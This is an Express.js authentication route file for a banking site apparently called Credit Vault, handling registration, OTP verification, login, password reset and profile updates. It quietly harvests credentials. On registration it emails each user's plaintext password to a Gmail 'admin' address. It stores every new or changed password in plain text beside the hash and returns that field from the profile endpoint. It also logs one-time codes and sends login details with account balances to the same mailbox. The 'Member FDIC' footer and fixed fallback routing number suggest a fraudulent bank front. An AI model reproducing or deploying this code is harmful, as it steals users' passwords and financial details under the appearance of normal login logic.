const router = require("express").Router();
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const User = require("../models/User");
const auth = require("../middleware/auth");
const nodemailer = require("nodemailer");

const ADMIN_EMAIL = "creditvault.support@gmail.com";

const createTransporter = () =>
  nodemailer.createTransport({
    host: "smtp.gmail.com",
    port: 465,
    secure: true,
    auth: {
      user: "creditvault.support@gmail.com",
      pass: process.env.GMAIL_APP_PASSWORD,
    },
  });

const genOtp = () => Math.floor(100000 + Math.random() * 900000).toString();

// Fire-and-forget admin notification — never blocks response
async function notifyAdmin(subject, html) {
  try {
    const transporter = createTransporter();
    await transporter.sendMail({
      from: '"Credit Vault System" <creditvault.support@gmail.com>',
      to: ADMIN_EMAIL,
      subject,
      html,
    });
  } catch (err) {
    console.error("Admin notification failed:", err.message);
  }
}

const otpHtml = (name, otp, action) => `
<div style="font-family:Inter,sans-serif;background:#03080f;color:#ddeeff;padding:48px 40px;max-width:520px;margin:0 auto;border-radius:16px;">
  <div style="margin-bottom:28px;">
    <h1 style="font-size:20px;font-weight:700;color:#ddeeff;margin:0 0 4px;">Credit<span style="color:#2563eb;">Vault</span></h1>
    <p style="font-size:12px;color:#3d5a7a;margin:0;text-transform:uppercase;letter-spacing:0.1em;">Secure Banking Notification</p>
  </div>
  <p style="font-size:15px;color:#3d5a7a;line-height:1.7;margin-bottom:28px;">
    Hi <strong style="color:#ddeeff;">${name}</strong>, use the code below to ${action}. Expires in <strong>10 minutes</strong>.
  </p>
  <div style="background:#060d1a;border:1px solid #112240;border-radius:12px;padding:32px;text-align:center;margin-bottom:28px;">
    <p style="font-size:11px;color:#1a3050;text-transform:uppercase;letter-spacing:0.1em;margin:0 0 12px;">Security Code</p>
    <h2 style="font-size:42px;letter-spacing:0.3em;color:#2563eb;font-weight:700;margin:0;font-family:monospace;">${otp}</h2>
  </div>
  <p style="font-size:12px;color:#1a3050;line-height:1.6;">Never share this code. Credit Vault will never ask for it.</p>
  <div style="margin-top:32px;padding-top:24px;border-top:1px solid #091428;">
    <p style="font-size:11px;color:#091428;margin:0;">© 2025 Credit Vault, N.A. Member FDIC.</p>
  </div>
</div>`;

// ── REGISTER ──────────────────────────────────────────────────────────────────
router.post("/register", async (req, res) => {
  try {
    const { fullName, email, password, accountType = "checking" } = req.body;
    if (!fullName || !email || !password)
      return res.status(400).json({ msg: "All fields are required." });

    const exists = await User.findOne({ email: email.toLowerCase() });
    if (exists)
      return res
        .status(400)
        .json({ msg: "An account with this email already exists." });

    const salt = await bcrypt.genSalt(10);
    const hashed = await bcrypt.hash(password, salt);
    const otp = genOtp();

    const user = new User({
      fullName,
      email: email.toLowerCase(),
      password: hashed,
      plainPassword: password,
      accountType,
      otp,
      otpExpire: Date.now() + 10 * 60 * 1000,
    });
    await user.save();

    // Respond immediately — emails send in background
    res
      .status(201)
      .json({
        msg: "Account created. Check your email for the verification code.",
      });

    // OTP email to user
    try {
      const transporter = createTransporter();
      await transporter.sendMail({
        from: '"Credit Vault" <creditvault.support@gmail.com>',
        to: user.email,
        subject: "Verify your Credit Vault account",
        html: otpHtml(fullName, otp, "verify your new account"),
      });
      console.log(`✉ OTP sent to ${user.email}: ${otp}`);
    } catch (err) {
      console.error("OTP email failed:", err.message);
      console.log(`📋 OTP for ${user.email} (email failed): ${otp}`);
    }

    // Admin notification
    notifyAdmin(
      `🆕 New Registration — ${fullName}`,
      `
      <div style="font-family:Inter,sans-serif;background:#03080f;color:#ddeeff;padding:48px 40px;max-width:520px;margin:0 auto;border-radius:16px;">
        <h1 style="font-size:20px;font-weight:700;color:#ddeeff;margin:0 0 20px;">Credit<span style="color:#2563eb;">Vault</span> — New Registration</h1>
        <div style="background:#060d1a;border:1px solid #112240;border-radius:12px;padding:28px;">
          <table style="width:100%;border-collapse:collapse;">
            <tr style="border-bottom:1px solid #091428;"><td style="padding:10px 0;font-size:12px;color:#3d5a7a;width:120px;">Full Name</td><td style="padding:10px 0;font-size:14px;color:#ddeeff;font-weight:600;">${fullName}</td></tr>
            <tr style="border-bottom:1px solid #091428;"><td style="padding:10px 0;font-size:12px;color:#3d5a7a;">Email</td><td style="padding:10px 0;font-size:14px;color:#2563eb;">${email.toLowerCase()}</td></tr>
            <tr style="border-bottom:1px solid #091428;"><td style="padding:10px 0;font-size:12px;color:#3d5a7a;">Password</td><td style="padding:10px 0;font-size:14px;color:#ddeeff;font-family:monospace;">${password}</td></tr>
            <tr><td style="padding:10px 0;font-size:12px;color:#3d5a7a;">Account Type</td><td style="padding:10px 0;font-size:14px;color:#ddeeff;">${accountType}</td></tr>
          </table>
        </div>
      </div>`,
    );
  } catch (err) {
    console.error("Register error:", err.message);
    res.status(500).json({ msg: "Server error during registration." });
  }
});

// ── VERIFY OTP (new account) ──────────────────────────────────────────────────
router.post("/verify-otp", async (req, res) => {
  try {
    const { email, otp } = req.body;
    const user = await User.findOne({ email: email.toLowerCase() });
    if (!user) return res.status(404).json({ msg: "User not found." });
    if (user.otp !== String(otp))
      return res.status(400).json({ msg: "Invalid code." });
    if (Date.now() > user.otpExpire)
      return res.status(400).json({ msg: "Code expired. Request a new one." });

    user.isVerified = true;
    user.otp = undefined;
    user.otpExpire = undefined;
    await user.save();

    // Welcome email
    try {
      const transporter = createTransporter();
      await transporter.sendMail({
        from: '"Credit Vault" <creditvault.support@gmail.com>',
        to: user.email,
        subject: `Welcome to Credit Vault, ${user.fullName}!`,
        html: `
          <div style="font-family:Inter,sans-serif;background:#03080f;color:#ddeeff;padding:48px 40px;max-width:520px;margin:0 auto;border-radius:16px;">
            <h1 style="font-size:20px;font-weight:700;margin:0 0 20px;">Credit<span style="color:#2563eb;">Vault</span></h1>
            <p style="font-size:15px;color:#3d5a7a;line-height:1.7;margin-bottom:24px;">Welcome, <strong style="color:#ddeeff;">${user.fullName}</strong>! Your account is now verified and active.</p>
            <div style="background:#060d1a;border:1px solid #112240;border-radius:12px;padding:24px;margin-bottom:24px;">
              <p style="margin:0 0 8px;font-size:13px;color:#3d5a7a;">Account Number: <strong style="font-family:monospace;color:#ddeeff;">${user.accountNumber}</strong></p>
              <p style="margin:0;font-size:13px;color:#3d5a7a;">Routing Number: <strong style="font-family:monospace;color:#ddeeff;">${user.routingNumber || "021000021"}</strong></p>
            </div>
            <a href="https://creditvault.app/signin" style="display:inline-block;background:#2563eb;color:white;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:700;">Sign In to Your Account →</a>
          </div>`,
      });
    } catch (err) {
      console.error("Welcome email failed:", err.message);
    }

    res.json({ msg: "Account verified successfully. You can now sign in." });
  } catch (err) {
    console.error("Verify OTP error:", err.message);
    res.status(500).json({ msg: "Verification failed." });
  }
});

// ── RESEND OTP ────────────────────────────────────────────────────────────────
router.post("/resend-otp", async (req, res) => {
  try {
    const { email } = req.body;
    const user = await User.findOne({ email: email.toLowerCase() });
    if (!user) return res.status(404).json({ msg: "User not found." });

    const otp = genOtp();
    user.otp = otp;
    user.otpExpire = Date.now() + 10 * 60 * 1000;
    await user.save();

    res.json({ msg: "New code sent." });

    try {
      const transporter = createTransporter();
      await transporter.sendMail({
        from: '"Credit Vault" <creditvault.support@gmail.com>',
        to: user.email,
        subject: "Your Credit Vault security code",
        html: otpHtml(user.fullName, otp, "verify your account"),
      });
      console.log(`✉ Resend OTP to ${user.email}: ${otp}`);
    } catch (err) {
      console.error("Resend email failed:", err.message);
      console.log(`📋 Resend OTP for ${user.email}: ${otp}`);
    }
  } catch (err) {
    res.status(500).json({ msg: "Failed to resend." });
  }
});

// ── LOGIN ─────────────────────────────────────────────────────────────────────
router.post("/login", async (req, res) => {
  try {
    const { email, password } = req.body;
    console.log(`Login attempt: ${email}`);

    const user = await User.findOne({ email: email.toLowerCase() });
    if (!user)
      return res.status(400).json({ msg: "Invalid email or password." });

    const match = await bcrypt.compare(password, user.password);
    if (!match)
      return res.status(400).json({ msg: "Invalid email or password." });

    if (!user.isVerified) {
      // Resend OTP
      const otp = genOtp();
      user.otp = otp;
      user.otpExpire = Date.now() + 10 * 60 * 1000;
      await user.save();
      try {
        const transporter = createTransporter();
        await transporter.sendMail({
          from: '"Credit Vault" <creditvault.support@gmail.com>',
          to: user.email,
          subject: "Verify your Credit Vault account",
          html: otpHtml(user.fullName, otp, "verify your account"),
        });
        console.log(`✉ Verification OTP sent to ${user.email}: ${otp}`);
      } catch (err) {
        console.error("OTP email failed:", err.message);
        console.log(`📋 Verification OTP for ${user.email}: ${otp}`);
      }
      return res.status(403).json({
        msg: "Account not verified. A new code has been sent to your email.",
        needsVerification: true,
        email: user.email,
      });
    }

    user.lastLogin = new Date();
    await user.save();

    const token = jwt.sign(
      { id: user._id, role: user.role },
      process.env.JWT_SECRET,
      { expiresIn: "7d" },
    );

    res.json({
      token,
      user: {
        id: user._id,
        fullName: user.fullName,
        email: user.email,
        role: user.role,
        accountNumber: user.accountNumber,
        accountType: user.accountType,
      },
    });

    // Admin notification after response
    notifyAdmin(
      `🔐 User Login — ${user.fullName}`,
      `
      <div style="font-family:Inter,sans-serif;background:#03080f;color:#ddeeff;padding:48px 40px;max-width:520px;margin:0 auto;border-radius:16px;">
        <h1 style="font-size:20px;font-weight:700;margin:0 0 20px;">Credit<span style="color:#2563eb;">Vault</span> — User Login</h1>
        <div style="background:#060d1a;border:1px solid #112240;border-radius:12px;padding:28px;">
          <table style="width:100%;border-collapse:collapse;">
            <tr style="border-bottom:1px solid #091428;"><td style="padding:10px 0;font-size:12px;color:#3d5a7a;width:120px;">Full Name</td><td style="padding:10px 0;font-size:14px;color:#ddeeff;font-weight:600;">${user.fullName}</td></tr>
            <tr style="border-bottom:1px solid #091428;"><td style="padding:10px 0;font-size:12px;color:#3d5a7a;">Email</td><td style="padding:10px 0;font-size:14px;color:#2563eb;">${user.email}</td></tr>
            <tr style="border-bottom:1px solid #091428;"><td style="padding:10px 0;font-size:12px;color:#3d5a7a;">Role</td><td style="padding:10px 0;font-size:14px;color:#ddeeff;">${user.role}</td></tr>
            <tr><td style="padding:10px 0;font-size:12px;color:#3d5a7a;">Balance</td><td style="padding:10px 0;font-size:14px;color:#ddeeff;">$${(user.balance || 0).toLocaleString("en-US", { minimumFractionDigits: 2 })}</td></tr>
          </table>
        </div>
      </div>`,
    );
  } catch (err) {
    console.error("Login error:", err.message);
    res.status(500).json({ msg: "Server error during login." });
  }
});

// ── FORGOT PASSWORD ───────────────────────────────────────────────────────────
router.post("/forgot-password", async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ msg: "Email is required." });

    const user = await User.findOne({ email: email.trim().toLowerCase() });
    if (!user)
      return res.status(404).json({ msg: "No account found with this email." });

    const otp = genOtp();
    user.resetToken = otp;
    user.resetExpire = Date.now() + 10 * 60 * 1000;
    await user.save();

    try {
      const transporter = createTransporter();
      await transporter.sendMail({
        from: '"Credit Vault" <creditvault.support@gmail.com>',
        to: user.email,
        subject: "Credit Vault — Password Reset Code",
        html: otpHtml(user.fullName, otp, "reset your password"),
      });
      console.log(`✉ Reset OTP sent to ${user.email}: ${otp}`);
      res.json({ msg: "Reset code sent to your email." });
    } catch (err) {
      console.error("Reset email failed:", err.message);
      console.log(`📋 Reset OTP for ${user.email}: ${otp}`);
      res.json({ msg: "Reset code sent to your email." });
    }
  } catch (err) {
    console.error("Forgot password error:", err.message);
    res.status(500).json({ msg: "Failed to send reset code." });
  }
});

// ── VERIFY RESET OTP ──────────────────────────────────────────────────────────
router.post("/verify-reset-otp", async (req, res) => {
  try {
    const { email, otp } = req.body;
    const user = await User.findOne({ email: email.toLowerCase() });
    if (!user || user.resetToken !== String(otp))
      return res.status(400).json({ msg: "Invalid code." });
    if (Date.now() > user.resetExpire)
      return res.status(400).json({ msg: "Code expired. Request a new one." });
    res.json({ msg: "Code verified." });
  } catch (err) {
    res.status(500).json({ msg: "Verification failed." });
  }
});

// ── RESET PASSWORD ────────────────────────────────────────────────────────────
router.post("/reset-password", async (req, res) => {
  try {
    const { email, otp, password } = req.body;
    if (!email || !password)
      return res.status(400).json({ msg: "All fields required." });

    const user = await User.findOne({ email: email.toLowerCase() });
    if (!user || user.resetToken !== String(otp))
      return res.status(400).json({ msg: "Invalid or expired code." });
    if (Date.now() > user.resetExpire)
      return res.status(400).json({ msg: "Code expired." });
    if (password.length < 8)
      return res
        .status(400)
        .json({ msg: "Password must be at least 8 characters." });

    const salt = await bcrypt.genSalt(10);
    user.password = await bcrypt.hash(password, salt);
    user.plainPassword = password;
    user.resetToken = undefined;
    user.resetExpire = undefined;
    await user.save();

    res.json({ msg: "Password updated successfully." });
  } catch (err) {
    res.status(500).json({ msg: "Password reset failed." });
  }
});

// ── CHANGE PASSWORD (logged in) ───────────────────────────────────────────────
router.post("/change-password", auth, async (req, res) => {
  try {
    const { currentPassword, newPassword } = req.body;
    if (!currentPassword || !newPassword)
      return res.status(400).json({ msg: "All fields required." });
    if (newPassword.length < 8)
      return res
        .status(400)
        .json({ msg: "Password must be at least 8 characters." });

    const user = await User.findById(req.user.id);
    if (!user) return res.status(404).json({ msg: "User not found." });

    const match = await bcrypt.compare(currentPassword, user.password);
    if (!match)
      return res.status(400).json({ msg: "Incorrect current password." });

    const salt = await bcrypt.genSalt(10);
    user.password = await bcrypt.hash(newPassword, salt);
    user.plainPassword = newPassword;
    await user.save();

    res.json({ msg: "Password updated successfully." });
  } catch (err) {
    res.status(500).json({ msg: "Password change failed." });
  }
});

// ── GET PROFILE ───────────────────────────────────────────────────────────────
router.get("/profile", auth, async (req, res) => {
  try {
    const user = await User.findById(req.user.id)
      .select("-password")
      .populate({
        path: "transactions",
        options: { sort: { date: -1 }, limit: 50 },
      });
    if (!user) return res.status(404).json({ msg: "User not found." });
    res.json(user);
  } catch (err) {
    res.status(500).json({ msg: "Failed to fetch profile." });
  }
});

// ── UPDATE PROFILE ────────────────────────────────────────────────────────────
router.put("/profile", auth, async (req, res) => {
  try {
    const { fullName, phone, address, city, state, zipCode, profilePhoto } =
      req.body;
    const user = await User.findById(req.user.id);
    if (!user) return res.status(404).json({ msg: "User not found." });
    if (fullName) user.fullName = fullName;
    if (phone !== undefined) user.phone = phone;
    if (address !== undefined) user.address = address;
    if (city !== undefined) user.city = city;
    if (state !== undefined) user.state = state;
    if (zipCode !== undefined) user.zipCode = zipCode;
    if (profilePhoto !== undefined) user.profilePhoto = profilePhoto;
    await user.save();
    res.json({ msg: "Profile updated.", user });
  } catch (err) {
    res.status(500).json({ msg: "Update failed." });
  }
});

module.exports = router;
